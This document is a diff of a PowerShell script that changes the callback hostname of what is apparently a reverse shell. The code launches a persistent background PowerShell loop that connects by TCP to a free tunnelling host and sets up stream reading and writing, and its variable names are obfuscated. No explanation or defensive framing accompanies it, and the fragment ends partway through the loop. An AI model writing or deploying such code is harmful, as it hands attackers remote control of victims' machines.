@@ -1,7 +1,7 @@
 Start-Process $PSHOME\powershell.exe -ArgumentList {
   while ($true) {
     try {
-      $2104c9cc9f294cd9a6d62f9ac96968a8 = New-Object Net.Sockets.TCPClient('115-186-190-46.a.free.pinggy.link', 34311);
+      $2104c9cc9f294cd9a6d62f9ac96968a8 = New-Object Net.Sockets.TCPClient('rnuto-115-186-190-46.a.free.pinggy.link', 34311);
       $5012fc220c634fbd9ce341a5509b0b1f = $2104c9cc9f294cd9a6d62f9ac96968a8.GetStream();
       $03f619a9bb1340458310955381cfb40e = New-Object IO.StreamWriter($5012fc220c634fbd9ce341a5509b0b1f);
       [byte[]]$335a4a9f0d964a3baf8f40116f8436d2 = 0..$2104c9cc9f294cd9a6d62f9ac96968a8.ReceiveBufferSize | % {0};
